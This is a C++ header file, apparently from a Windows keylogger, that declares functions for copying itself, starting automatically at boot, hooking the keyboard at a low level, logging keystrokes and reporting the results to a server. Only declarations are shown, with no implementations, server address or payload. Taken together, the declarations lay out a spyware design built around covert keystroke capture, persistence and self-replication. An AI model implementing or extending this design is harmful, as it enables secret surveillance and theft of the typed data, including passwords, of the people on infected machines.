#include <iostream>
#include <Windows.h>
#include <synchapi.h>
#include "cipher.hpp"
#pragma comment(lib, "kernel32.lib")

// Replicate itself
std::string cpSelf();

// Start by boot
bool autoStart(std::string whichToAutoStart);

// Save Log

// Send keyCount result to server
int report(DWORD keyCount);

// Keylogger
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
DWORD WINAPI KeyLogger(LPVOID lpParameter);
int startKeyLogging();